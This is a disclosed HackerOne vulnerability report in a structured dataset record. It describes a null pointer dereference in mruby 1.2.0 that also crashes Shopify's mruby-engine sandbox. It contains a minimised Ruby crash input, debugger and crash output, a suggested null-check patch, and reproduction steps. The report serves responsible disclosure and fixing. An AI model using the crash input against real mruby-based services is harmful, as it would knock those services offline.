{
  "reported_to": "shopify-scripts",
  "reported_by": "haquaman ",
  "title": "Denial of Service in mruby due to null pointer dereference",
  "content": "\nHi,\nThe following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, and renamed variables so you can see what is needed and what isn't.\nCode 103 Bytes\n1a=*\"any splat operator\", case \"any object or nil\"\n2when \"any value\"\n3  redo |b|\n4  \"any return object\"\n5end\nCode 52 Bytes\n1$ ./dev/bin/mruby --version\n2mruby 1.2.0 (2015-11-17)\nCode 49 Bytes\n1$ ./dev/bin/mruby crash.rb\n2Segmentation fault: 11\nCode 2.11 KiB\n1$ lldb ./dev/bin/mruby crash.rb\n2(lldb) target create \"./dev/bin/mruby\"\n3Current executable set to './dev/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash.rb\"\n5(lldb) r\n6Process 18945 launched: './dev/bin/mruby' (x86_64)\n7Process 18945 stopped\n8* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)\n9    frame #0: 0x0000000100001814 mruby`ary_modify + 20\n10mruby`ary_modify:\n11->  0x100001814 <+20>: movl   (%rsi), %eax\n12    0x100001816 <+22>: shrl   $0xb, %eax\n13    0x100001819 <+25>: andl   $0x100, %eax              ; imm = 0x100\n14    0x10000181e <+30>: cmpl   $0x0, %eax\n15(lldb) bt\n16* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)\n17  * frame #0: 0x0000000100001814 mruby`ary_modify + 20\n18    frame #1: 0x0000000100001e10 mruby`mrb_ary_push + 48\n19    frame #2: 0x00000001000426d5 mruby`mrb_vm_exec + 25589\n20    frame #3: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n21    frame #4: 0x00000001000446b4 mruby`mrb_top_run + 100\n22    frame #5: 0x000000010006f19f mruby`load_exec + 1183\n23    frame #6: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n24    frame #7: 0x0000000100000d78 mruby`main + 904\n25    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n26    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n27(lldb) register read\n28General Purpose Registers:\n29       rax = 0x0000000000000000\n30       rbx = 0x0000000000000000\n31       rcx = 0x0000000000000000\n32       rdx = 0x0000000000000000\n33       rdi = 0x0000000100600000\n34       rsi = 0x0000000000000000\n35       rbp = 0x00007fff5fbfc9f0\n36       rsp = 0x00007fff5fbfc9c0\n37        r8 = 0x0000000000000000\n38        r9 = 0x00007fff5fbfc380\n39       r10 = 0x5d00add5139cce40\n40       r11 = 0x0000000000000001\n41       r12 = 0x0000000000000000\n42       r13 = 0x0000000000000000\n43       r14 = 0x0000000000000000\n44       r15 = 0x0000000000000000\n45       rip = 0x0000000100001814  mruby`ary_modify + 20\n46    rflags = 0x0000000000010206\n47        cs = 0x000000000000002b\n48        fs = 0x0000000000000000\n49        gs = 0x0000000000000000\n50\n51(lldb) \nThe cause for this is there is a null RArray struct getting sent via a ptr to mrb_ary_push, and then the program is trying to retrieve and set members of this null struct.\nA patch to fix this would be similar to:\nCode 377 Bytes\n1diff --git a/src/array.c b/src/array.c\n2index df95383..47d5ce8 100644\n3--- a/src/array.c\n4+++ b/src/array.c\n5@@ -406,6 +406,9 @@ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)\n6 {\n7   struct RArray *a = mrb_ary_ptr(ary);\n8 \n9+  /* FIXME: throw an error? */\n10+  if (!a) return;\n11+\n12   ary_modify(mrb, a);\n13   if (a->len == a->aux.capa)\n14     ary_expand_capa(mrb, a, a->len + 1);\nAs mentioned above, this also affected mruby-engine via this:\nCode 2.43 KiB\n113:25 $ ./bin/sandbox crash.rb\n2./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000002\n3ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n4\n5-- Crash Report log information --------------------------------------------\n6   See Crash Report log file under the one of following:\n7     * ~/Library/Logs/CrashReporter\n8     * /Library/Logs/CrashReporter\n9     * ~/Library/Logs/DiagnosticReports\n10     * /Library/Logs/DiagnosticReports\n11   for more details.\n12Don't forget to include the above Crash Report log file in bug reports.\n13\n14-- Control frame information -----------------------------------------------\n15c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n16c:0002 p:0201 s:0005 E:001658 EVAL   ./bin/sandbox:20 [FINISH]\n17c:0001 p:0000 s:0002 E:000c00 (none) [FINISH]\n18\n19-- Ruby level backtrace information ----------------------------------------\n20./bin/sandbox:20:in `<main>'\n21./bin/sandbox:20:in `sandbox_eval'\n22\n23-- Machine register context ------------------------------------------------\n24 rax: 0x0000000000000001 rbx: 0x00000001016665a8 rcx: 0x0000000101678a60\n25 rdx: 0x0000000000000000 rdi: 0x0000000101666440 rsi: 0x0000000000000000\n26 rbp: 0x00007fff5efe5f10 rsp: 0x00007fff5efe5ef0  r8: 0x0000000000000001\n27  r9: 0x0000000000000000 r10: 0x0000000000000001 r11: 0x00000001016665a8\n28 r12: 0x0000000000000000 r13: 0x0000000101666440 r14: 0x0000000101666440\n29 r15: 0x0000000000000000 rip: 0x00000001015440f1 rfl: 0x0000000000010202\n30\n31-- C level backtrace information -------------------------------------------\n320   ruby                                0x0000000100db65d4 rb_vm_bugreport + 388\n331   ruby                                0x0000000100c58023 rb_bug_context + 483\n342   ruby                                0x0000000100d2b653 sigsegv + 83\n353   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n364   mruby_engine.bundle                 0x00000001015440f1 ary_modify + 17\n375   ???                                 0x00000001016665a8 0x0 + 4318455208\n38\n39-- Other runtime information -----------------------------------------------\n40\n41* Loaded script: ./bin/sandbox\n42\n43* Loaded features:\n44\n45    0 enumerator.so\n46    1 thread.rb\n47    2 rational.so\n48    3 complex.so\n49<snip various gems>\n50  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n51  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n52\n53[NOTE]\n54You may have encountered a bug in the Ruby interpreter or extension libraries.\n55Bug reports are welcome.\n56For details: http://www.ruby-lang.org/bugreport.html\n57\n58Abort trap: 6\n59\nAfter applying that patch to ext/mruby_engine/mruby and recompiling, that crash no longer happens.\nJust to clarify, I'm not to sure how one would achieve $10,000 for denial of service against Shopify\u2019s infrastructure caused by a bug in mruby or mruby_engine (for example, a crash in the native library). as your rules clearly state to not test against your infrastructure. Is that something your end tests after submission of the bug?\nAlso, should I approach mruby directly to get the patch resolved?\nCheers,\nHugh\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 8000,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1482023340,
  "report_url": "https://hackerone.com/reports/181232",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby file 'crash.rb' with the following content:\n1a=*\"any splat operator\", case \"any object or nil\"\n2when \"any value\"\n3  redo |b|\n4  \"any return object\"\n5end"
    ],
    [
      2,
      "Execute the file using mruby: ./dev/bin/mruby crash.rb"
    ]
  ],
  "vuln_description": "The vulnerability is a Denial of Service (DoS) in mruby caused by a null pointer dereference when processing a specific Ruby code pattern involving splat operators and case statements with redo. This leads to a segmentation fault as the program attempts to access members of a null RArray struct.",
  "reason": "The vulnerability requires understanding of Ruby's parsing and execution internals, specifically how mruby handles array operations and control flow structures. The triggering code pattern is non-obvious and involves subtle interactions between splat operators, case statements, and redo operations. However, once the pattern is known, reproducing the issue is straightforward.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}